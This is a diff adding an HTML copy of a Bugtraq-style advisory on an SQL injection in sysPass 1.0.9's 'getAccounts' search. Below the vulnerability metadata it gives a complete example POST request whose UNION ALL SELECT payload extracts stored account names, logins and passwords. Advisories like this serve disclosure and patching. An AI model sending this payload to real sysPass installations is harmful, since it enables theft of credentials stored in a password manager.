@@ -1,0 +1,95 @@
+#SpeeDr00t@Black Falcon<br>#bid75906<p><b><span style="font-size: 18pt;">sysPass 'getAccounts' Parameter SQL Injection Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/75906/info">info</a><br><a href="http://www.securityfocus.com/bid/75906/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/75906/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/75906/solution">solution</a><br><a href="http://www.securityfocus.com/bid/75906/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				75906
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Jul 13 2015 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jul 13 2015 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Daniele Salaris (SySS GmbH)
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					cygnux.org sysPass 1.0.9 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	Attackers can exploit this issue using browser.  <br/> <br/>The following example request is available:   <br/> <br/>POST /sysPass-1.0.9/ajax/ajax_search.php HTTP/1.1  <br/>Host: www.example.com<br/>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:39.0) Gecko/20100101 Firefox/39.0  <br/>Accept: text/html, */*; q=0.01  <br/>Accept-Language: en-US,en;q=0.5  <br/>Accept-Encoding: gzip, deflate  <br/>Content-Type: application/x-www-form-urlencoded; charset=UTF-8  <br/>X-Requested-With: XMLHttpRequest  <br/>Referer: http://www.example.com/sysPass-1.0.9/index.php  <br/>Content-Length: 249  <br/>Cookie: PHPSESSID=&amp;lt;SESSIONID&amp;gt;  <br/>Connection: keep-alive  <br/>Pragma: no-cache  <br/>Cache-Control: no-cache  <br/> <br/>search=getAccounts') UNION ALL SELECT   <br/>NULL,NULL,account_name,account_login,account_pass,account_url,NULL,NULL,NULL,NULL,NULL from accounts --   <br/>&amp;amp;start=0&amp;amp;skey=1&amp;amp;sorder=1&amp;amp;sk=081bad3198bdb3cd29133befc57d60287541663b&amp;amp;is_ajax=1&amp;amp;customer=0&amp;amp;category=0&amp;amp;rpp=10
+	
+		<ul>
+</ul>
+</div>
